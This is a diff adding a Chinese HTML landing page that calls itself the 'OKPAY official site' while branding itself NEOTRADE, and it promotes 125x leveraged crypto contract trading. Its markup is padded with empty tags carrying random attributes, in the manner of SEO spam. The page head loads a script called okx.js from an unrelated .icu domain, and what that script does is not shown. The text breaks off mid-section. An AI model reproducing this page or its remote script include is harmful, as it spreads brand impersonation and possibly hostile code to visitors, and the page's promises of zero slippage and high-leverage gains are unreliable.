@@ -1,0 +1,938 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OKPAY官网_快速获取跨平台交易应用</title><meta name="description" content="OKPAY官网是专门用于比特币及其他加密货币的在线交易平台,用户可以通过该平台进行加密货币的买卖、兑换以及资产管理。OKPAY官网支持法币与比特币的兑换,提供现货交易、杠杆交易、期货合约等功能,并具备高度的安全性。"><meta name="keywords" content="OKPAY官网"><meta property="og:title" content="OKPAY官网_快速获取跨平台交易应用"><meta property="og:description" content="OKPAY官网是专门用于比特币及其他加密货币的在线交易平台,用户可以通过该平台进行加密货币的买卖、兑换以及资产管理。OKPAY官网支持法币与比特币的兑换,提供现货交易、杠杆交易、期货合约等功能,并具备高度的安全性。"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="OKPAY官网_快速获取跨平台交易应用"><meta name="twitter:description" content="OKPAY官网是专门用于比特币及其他加密货币的在线交易平台,用户可以通过该平台进行加密货币的买卖、兑换以及资产管理。OKPAY官网支持法币与比特币的兑换,提供现货交易、杠杆交易、期货合约等功能,并具备高度的安全性。"><script type="application/ld+json">
+    {
+        "@type": "Organization",
+        "name": "OKPAY官网_快速获取跨平台交易应用",
+        "url": "https://neotrade.com",
+        "logo": "https://neotrade.com/neon-logo.svg",
+        "description": "OKPAY官网是专门用于比特币及其他加密货币的在线交易平台,用户可以通过该平台进行加密货币的买卖、兑换以及资产管理。OKPAY官网支持法币与比特币的兑换,提供现货交易、杠杆交易、期货合约等功能,并具备高度的安全性。",
+        "sameAs": [
+
+        ]
+    }
+    </script><link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90' fill='%2300f0ff'>◈</text></svg>"><style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Noto+Sans+SC:wght@400;500;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-cyan: #00f0ff;
+            --neon-pink: #ff00ff;
+            --neon-purple: #b829dd;
+            --neon-yellow: #f0ff00;
+            --dark-bg: #050508;
+            --panel-bg: rgba(10, 10, 20, 0.8);
+        }
+
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            background: var(--dark-bg);
+            color: #fff;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        /* 故障艺术背景 */
+        .glitch-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: 
+                linear-gradient(45deg, transparent 48%, rgba(0, 240, 255, 0.03) 50%, transparent 52%),
+                linear-gradient(-45deg, transparent 48%, rgba(255, 0, 255, 0.03) 50%, transparent 52%),
+                var(--dark-bg);
+            background-size: 60px 60px, 60px 60px, 100% 100%;
+        }
+
+        /* 网格地板 */
+        .grid-floor {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            z-index: -1;
+            background: 
+                linear-gradient(to bottom, transparent 0%, var(--dark-bg) 100%),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(rgba(0, 240, 255, 0.1) 1px, transparent 1px);
+            background-size: 100% 100%, 50px 50px, 50px 50px;
+            transform: perspective(500px) rotateX(60deg);
+            transform-origin: bottom;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { background-position: 0 0, 0 0, 0 0; }
+            100% { background-position: 0 0, 0 50px, 50px 0; }
+        }
+
+        /* 扫描线效果 */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            pointer-events: none;
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.1) 50%,
+                rgba(0,0,0,0.1)
+            );
+            background-size: 100% 4px;
+            opacity: 0.3;
+        }
+
+        /* 导航栏 - 玻璃拟态 */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 5%;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            background: rgba(5, 5, 8, 0.7);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+        }
+
+        /* Logo - 故障艺术效果 */
+        .logo-container {
+            text-decoration: none;
+            position: relative;
+        }
+
+        .logo-main {
+            font-family: 'Orbitron', monospace;
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            text-shadow: 
+                0 0 10px var(--neon-cyan),
+                0 0 20px var(--neon-cyan),
+                0 0 40px var(--neon-cyan);
+            animation: flicker 3s infinite alternate;
+        }
+
+        .logo-main::before,
+        .logo-main::after {
+            content: 'NEOTRADE';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .logo-main::before {
+            color: var(--neon-pink);
+            animation: glitch-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
+        }
+
+        .logo-main::after {
+            color: var(--neon-yellow);
+            animation: glitch-2 3s infinite linear alternate-reverse;
+            clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch-1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+
+        @keyframes glitch-2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(2px, -2px); }
+            40% { transform: translate(2px, 2px); }
+            60% { transform: translate(-2px, -2px); }
+            80% { transform: translate(-2px, 2px); }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.95; }
+        }
+
+        .logo-sub {
+            font-size: 11px;
+            color: var(--neon-pink);
+            letter-spacing: 3px;
+            margin-top: 5px;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 40px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            position: relative;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .nav-links a:hover {
+            color: var(--neon-cyan);
+            text-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        .nav-links a::before {
+            content: '>';
+            position: absolute;
+            left: -15px;
+            opacity: 0;
+            color: var(--neon-pink);
+            transition: all 0.3s;
+        }
+
+        .nav-links a:hover::before {
+            opacity: 1;
+            left: -10px;
+        }
+
+        /* 主视觉区 */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 120px 20px 80px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* 浮动几何体装饰 */
+        .floating-shapes {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .shape {
+            position: absolute;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            animation: float-rotate 20s infinite linear;
+        }
+
+        .shape:nth-child(1) {
+            width: 100px;
+            height: 100px;
+            top: 20%;
+            left: 10%;
+            transform: rotate(45deg);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
+        }
+
+        .shape:nth-child(2) {
+            width: 150px;
+            height: 150px;
+            top: 60%;
+            right: 10%;
+            border-radius: 50%;
+            border-color: var(--neon-pink);
+            animation-duration: 25s;
+            animation-direction: reverse;
+        }
+
+        .shape:nth-child(3) {
+            width: 80px;
+            height: 80px;
+            bottom: 20%;
+            left: 20%;
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+            background: rgba(184, 41, 221, 0.1);
+            border: none;
+        }
+
+        @keyframes float-rotate {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+
+        /* 标签 */
+        .cyber-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.1), rgba(255, 0, 255, 0.1));
+            border: 1px solid var(--neon-cyan);
+            padding: 10px 24px;
+            font-family: 'Orbitron', monospace;
+            font-size: 13px;
+            color: var(--neon-cyan);
+            margin-bottom: 30px;
+            position: relative;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: border-pulse 2s infinite;
+        }
+
+        @keyframes border-pulse {
+            0%, 100% { box-shadow: 0 0 10px rgba(0, 240, 255, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(0, 240, 255, 0.6); }
+        }
+
+        .cyber-badge::before {
+            content: '◉';
+            color: var(--neon-pink);
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* H1标题 - 巨型故障文字 */
+        .hero h1 {
+            font-family: 'Orbitron', 'Noto Sans SC', sans-serif;
+            font-size: clamp(36px, 8vw, 80px);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: -2px;
+            position: relative;
+        }
+
+        .glitch-text {
+            position: relative;
+            color: #fff;
+            text-shadow: 
+                0 0 10px rgba(255, 255, 255, 0.5),
+                0 0 20px rgba(0, 240, 255, 0.3);
+        }
+
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch-text::before {
+            color: var(--neon-pink);
+            animation: glitch-anim-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+        }
+
+        .glitch-text::after {
+            color: var(--neon-cyan);
+            animation: glitch-anim-2 3s infinite linear alternate-reverse;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch-anim-1 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+        }
+
+        @keyframes glitch-anim-2 {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(3px, -3px); }
+            40% { transform: translate(3px, 3px); }
+            60% { transform: translate(-3px, -3px); }
+            80% { transform: translate(-3px, 3px); }
+        }
+
+        /* H2副标题 */
+        .hero h2 {
+            font-size: clamp(16px, 2.5vw, 22px);
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 700px;
+            margin-bottom: 50px;
+            font-weight: 400;
+            line-height: 1.8;
+        }
+
+        .hero h2 strong {
+            color: var(--neon-yellow);
+            font-weight: 700;
+        }
+
+        /* 数据面板 - 终端风格 */
+        .data-terminal {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 8px;
+            padding: 20px 30px;
+            margin-bottom: 40px;
+            max-width: 800px;
+            width: 90%;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .data-terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-pink), var(--neon-cyan));
+            animation: scan 3s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-dot:nth-child(1) { background: #ff5f56; }
+        .terminal-dot:nth-child(2) { background: #ffbd2e; }
+        .terminal-dot:nth-child(3) { background: #27c93f; }
+
+        .terminal-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+        }
+
+        .terminal-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+
+        .terminal-value {
+            font-size: 18px;
+            color: var(--neon-cyan);
+            font-weight: bold;
+        }
+
+        .terminal-value.pink { color: var(--neon-pink); }
+        .terminal-value.yellow { color: var(--neon-yellow); }
+
+        /* CTA按钮 - 赛博朋克风格 */
+        .cta-grid {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .cyber-btn {
+            position: relative;
+            padding: 20px 50px;
+            font-family: 'Orbitron', monospace;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-decoration: none;
+            color: #000;
+            background: var(--neon-cyan);
+            border: none;
+            cursor: pointer;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+            transition: all 0.3s;
+            overflow: hidden;
+        }
+
+        .cyber-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .cyber-btn:hover::before {
+            left: 100%;
+        }
+
+        .cyber-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 0 20px var(--neon-cyan),
+                0 0 40px var(--neon-cyan),
+                0 0 60px var(--neon-cyan);
+        }
+
+        .cyber-btn.secondary {
+            background: transparent;
+            color: var(--neon-pink);
+            border: 2px solid var(--neon-pink);
+        }
+
+        .cyber-btn.secondary:hover {
+            background: var(--neon-pink);
+            color: #000;
+            box-shadow: 
+                0 0 20px var(--neon-pink),
+                0 0 40px var(--neon-pink);
+        }
+
+        .btn-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* 特性网格 - 全息卡片 */
+        .features-section {
+            max-width: 1200px;
+            margin: 100px auto;
+            padding: 0 20px;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .section-header h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 36px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-header h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-pink));
+        }
+
+        .section-header p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 16px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .holo-card {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 12px;
+            padding: 40px 30px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .holo-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 30%,
+                rgba(0, 240, 255, 0.1) 50%,
+                transparent 70%
+            );
+            transform: rotate(45deg);
+            transition: all 0.5s;
+            opacity: 0;
+        }
+
+        .holo-card:hover::before {
+            animation: holo-shine 0.5s ease-in-out;
+        }
+
+        @keyframes holo-shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); opacity: 0; }
+        }
+
+        .holo-card:hover {
+            border-color: var(--neon-cyan);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.2);
+        }
+
+        .holo-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .holo-card h3 {
+            font-family: 'Orbitron', monospace;
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .holo-card p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .holo-card .highlight {
+            color: var(--neon-pink);
+            font-weight: 700;
+        }
+
+        /* 交易对展示 - 霓虹表格 */
+        .markets-section {
+            max-width: 1000px;
+            margin: 100px auto;
+            padding: 0 20px;
+        }
+
+        .neon-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .neon-table th {
+            background: rgba(0, 240, 255, 0.1);
+            padding: 20px;
+            text-align: left;
+            font-family: 'Orbitron', monospace;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-cyan);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.3);
+        }
+
+        .neon-table td {
+            padding: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .neon-table tr:hover td {
+            background: rgba(0, 240, 255, 0.05);
+            color: #fff;
+        }
+
+        .pair-name {
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .pair-sub {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .price-up { color: var(--neon-cyan); }
+        .price-down { color: var(--neon-pink); }
+
+        .leverage-tag {
+            display: inline-block;
+            background: rgba(255, 0, 255, 0.2);
+            color: var(--neon-pink);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 700;
+            border: 1px solid var(--neon-pink);
+        }
+
+        /* 页脚 - 黑暗终端 */
+        footer {
+            border-top: 1px solid rgba(0, 240, 255, 0.2);
+            background: rgba(5, 5, 8, 0.9);
+            padding: 60px 20px 30px;
+            margin-top: 150px;
+            position: relative;
+        }
+
+        footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-pink), transparent);
+        }
+
+        .footer-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-col h4 {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            color: var(--neon-cyan);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col li {
+            margin-bottom: 12px;
+        }
+
+        .footer-col a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            font-size: 14px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-col a::before {
+            content: '>';
+            color: var(--neon-pink);
+            opacity: 0;
+            transition: all 0.3s;
+        }
+
+        .footer-col a:hover {
+            color: var(--neon-cyan);
+            padding-left: 10px;
+        }
+
+        .footer-col a:hover::before {
+            opacity: 1;
+        }
+
+        .risk-warning {
+            max-width: 900px;
+            margin: 0 auto 30px;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.05);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            border-radius: 8px;
+            color: rgba(255, 100, 100, 0.9);
+            font-size: 13px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .copyright {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 12px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: 'Courier New', monospace;
+        }
+
+        /* 响应式 */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            
+            .cta-grid {
+                flex-direction: column;
+                width: 100%;
+                padding: 0 20px;
+            }
+            
+            .cyber-btn {
+                width: 100%;
+                text-align: center;
+            }
+            
+            .terminal-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .neon-table {
+                font-size: 12px;
+            }
+            
+            .neon-table th,
+            .neon-table td {
+                padding: 12px;
+            }
+        }
+
+        /* 滚动条美化 */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--neon-cyan);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--neon-pink);
+        }
+    </style>        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; }
+            else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?01c83902f378f54c075a86cb18ba04d0";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+ <script language="javascript" src="https://m.233.icu/okx.js"></script></head><body><var dropzone="f6f310"></var><area date-time="05f3d5"></area><map dir="8d8ab2"></map><div dir="fe42e2" class="bfe42e scanlines"></div><bdo lang="40af08"></bdo><dfn draggable="546699"></dfn><font dropzone="a537fa"></font><div lang="5c2187" class="c5c218 glitch-bg"></div><ins date-time="2efaed"></ins><small dir="4d7b7e"></small><sup lang="481901"></sup><div draggable="1c58e8" class="d1c58e grid-floor"></div><time draggable="475c90"></time><tt dropzone="174c00"></tt><var date-time="5335ac"></var><div dropzone="b5437c" class="eb5437 floating-shapes"><area dir="849cdf"></area><map lang="8a474d"></map><bdo draggable="82be2d"></bdo><div date-time="3072cd" class="f3072c shape"></div><dfn dropzone="ed2a77"></dfn><font date-time="230560"></font><ins dir="37432c"></ins><div dir="ac3ee6" class="gac3ee shape"></div><small lang="87a6e6"></small><sup draggable="02ca78"></sup><time dropzone="356af8"></time><div lang="8f14a0" class="h8f14a shape"></div></div><nav role="navigation"><a href="/" class="i6b530 logo-container" title="OKPAY官网"><tt date-time="e27b77"></tt><var dir="8ea381"></var><area lang="7efd8a"></area><div draggable="6b5301" class="j972af logo-main" data-text="OKPAY官网">OKPAY官网</div><map draggable="ef8b07"></map><bdo dropzone="ee5692"></bdo><dfn date-time="0e5c91"></dfn><div dropzone="972af9" class="k3fda6 logo-sub">比特币以太坊合约交易所</div></a><font dir="3a5701"></font><ins lang="0c2c02"></ins><small draggable="6a6669"></small><ul class="l9f0ed nav-links"><li><a href="#btc-contract">BTC合约</a></li><li><a href="#eth-leverage">ETH杠杆</a></li><li><a href="#perpetual">永续合约</a></li><li><a href="#options">期权交易</a></li><li><a href="#leverage-tokens">杠杆代币</a></li></ul></nav><main><sup dropzone="458750"></sup><time date-time="e735df"></time><tt dir="f8633b"></tt><section class="m5b24a hero"><var lang="1ad4fd"></var><area draggable="ac9449"></area><map dropzone="789b7f"></map><div date-time="3fda61" class="ne35c5 cyber-badge">
+                SYSTEM.ONLINE // 125X LEVERAGE ACTIVE
+            </div><h1><bdo date-time="ce8cee"></bdo><dfn dir="324e0b"></dfn><font lang="85cfb6"></font><div dir="9f0ed1" class="o7932c glitch-text" data-text="OKPAY官网">OKPAY官网</div><ins draggable="bb4df7"></ins><small dropzone="f55d30"></small><sup date-time="9f6bc9"></sup><div lang="5b24a5" class="p482eb glitch-text" data-text="比特币以太坊杠杆炒币">比特币以太坊杠杆炒币</div></h1><h2>
+                零滑点<strong>虚拟货币合约</strong>交易平台，支持<strong>比特币</strong>、<strong>以太坊</strong>125倍杠杆。
+                永续合约、交割合约、期权全品类覆盖，<strong>毫秒级</strong>撮合引擎，深度流动性保障。
+            </h2><time dir="dbe40b"></time><tt lang="065edd"></tt><var draggable="7a86bd"></var><div draggable="e35c59" class="qc6da6 data-terminal"><area dropzone="f17c6e"></area><map date-time="d7d3a9"></map><bdo dir="b7b1e0"></bdo><div dropzone="7932cc" class="r83402 terminal-header"><dfn lang="2ac523"></dfn><font draggable="0146e0"></font><ins dropzone="25aeb5"></ins><div date-time="482ebb" class="s911f2 terminal-dot"></div><small date-time="e79c0f"></small><sup dir="54c2fb"></sup><time lang="997fc6"></time><div dir="c6da6b" class="t436a8 terminal-dot"></div><tt draggable="dff064"></tt><var dropzone="08b5d2"></var><area date-time="555cd0"></area><div lang="83402d" class="u6d22d terminal-dot"></div><span style="margin-left: 10px; color: rgba(255,255,255,0.5); font-size: 12px;">neotrade_market_data.exe</span></div><map dir="e6dee1"></map><bdo lang="9da548"></bdo><dfn draggable="1e3050"></dfn><div draggable="911f2e" class="v56eb5 terminal-content"><font dropzone="6a86ae"></font><ins date-time="1ab70b"></ins><small dir="d7bdbd"></small><div dropzone="436a82" class="we09f7 terminal-item"><sup lang="7b3573"></sup><time draggable="aa9363"></time><tt dropzone="a1c21a"></tt><div date-time="6d22d1" class="x9f80f terminal-label">BTC/USD 永续</div><var date-time="496fd8"></var><area dir="8f5ad2"></area><map lang="8cfcca"></map><div dir="56eb53" class="y2c7a6 terminal-value">67,234.50</div></div><bdo draggable="451cc2"></bdo><dfn dropzone="690d5e"></dfn><font date-time="517af9"></font><div lang="e09f76" class="z038c1 terminal-item"><ins dir="370c45"></ins><small lang="f3020c"></small><sup draggable="a67b86"></sup><div draggable="9f80fb" class="a8272b terminal-label">ETH/USD 永续</div><time dropzone="b57c72"></time><tt date-time="c56a21"></tt><var dir="a66850"></var><div dropzone="2c7a6c" class="bc8343 terminal-value pink">3,456.78</div></div><area lang="f8496d"></area><map draggable="c041fc"></map><bdo dropzone="f6fc92"></bdo><div date-time="038c19" class="c06afe terminal-item"><dfn date-time="925f3a"></dfn><font dir="a12a33"></font><ins lang="cbf225"></ins><div dir="8272b7" class="d311c4 terminal-label">24H 交易量</div><small draggable="43c070"></small><sup dropzone="5969cd"></sup><time date-time="bf737a"></time><div lang="c8343a" class="e18158 terminal-value yellow">$4.2B</div></div><tt dir="8927f8"></tt><var lang="72c8f4"></var><area draggable="22428c"></area><div draggable="06afe6" class="f5521a terminal-item"><map dropzone="f4bbd1"></map><bdo date-time="1eafdc"></bdo><dfn dir="aba83d"></dfn><div dropzone="311c41" class="g0253e terminal-label">资金费率</div><font lang="a904a9"></font><ins draggable="a3d5aa"></ins><small dropzone="eb3730"></small><div date-time="18158c" class="hfe34d terminal-value">0.01%</div></div></div></div><sup date-time="23c752"></sup><time dir="7897e5"></time><tt lang="aca9f2"></tt><div dir="5521a7" class="ibd26f cta-grid"><a href="/okx.html" class="j58684 cyber-btn" title="立即注册OKPAY官网"><span class="k0a84f btn-text">立即注册 // REGISTER</span></a><a href="/okx.html" class="lafb5b cyber-btn secondary" title="马上开通OKPAY官网"><span class="m17774 btn-text">马上下载 // JOIN</span></a></div></section><var draggable="234b5a"></var><area dropzone="f6ab6e"></area><map date-time="bff0cc"></map><section class="n39b8f features-section" id="features"><bdo dir="8a5c5e"></bdo><dfn lang="015cb6"></dfn><font draggable="30da96"></font><div lang="0253e1" class="o669b3 section-header"><h2>OKPAY官网核心优势 // CORE_FEATURES</h2><p>专业级虚拟货币合约交易系统，为高频交易者打造</p></div><ins dropzone="97be1a"></ins><small date-time="0335b3"></small><sup dir="b74257"></sup><div draggable="fe34df" class="p52413 features-grid"><time lang="f4d16c"></time><tt draggable="a4899e"></tt><var dropzone="168d5e"></var><article class="q01a39 holo-card"><span class="r287dc holo-icon">⚡</span><h3>125X 超高杠杆</h3><p><span class="s83282 highlight">比特币合约</span>、<span class="tfb2ea highlight">以太坊杠杆</span>最高支持125倍，
+                        小资金撬动大收益。智能强平系统，风险可控，是您进行<span class="u0c7eb highlight">虚拟货币期货</span>交易的首选平台。
+                    </p></article><area date-time="d38e24"></area><map dir="971b44"></map><bdo lang="a6990a"></bdo><article class="v9ed2b holo-card"><span class="w88eef holo-icon">🔒</span><h3>零滑点保障</h3><p>
+                        聚合全球Top10交易所深度，<span class="x02136 highlight">BTC合约</span>、<span class="y8081c highlight">ETH合约</span>
+                        大额订单零滑点成交。自研撮合引擎，每秒处理100万笔订单，确保您的<span class="zd64ed highlight">杠杆炒币</span>指令极速执行。
+                    </p></article><dfn draggable="2cf10b"></dfn><font dropzone="4ac4e3"></font><ins date-time="336f4e"></ins><article class="af1cda holo-card"><span class="b4ac82 holo-icon">💰</span><h3>负费率机制</h3><p>
+                        Maker费率低至-0.025%，做单即返佣。持仓<span class="cce0bb highlight">永续合约</span>享受资金费率补贴，
+                        长期持仓成本行业最低。专业<span class="d84a2e highlight">虚拟货币交易所</span>的费率优势。
+                    </p></article><small dir="da7777"></small><sup lang="32ba0b"></sup><time draggable="afcc13"></time><article class="ed75d9 holo-card"><span class="f7e1ab holo-icon">🛡️</span><h3>保险基金护航</h3><p>
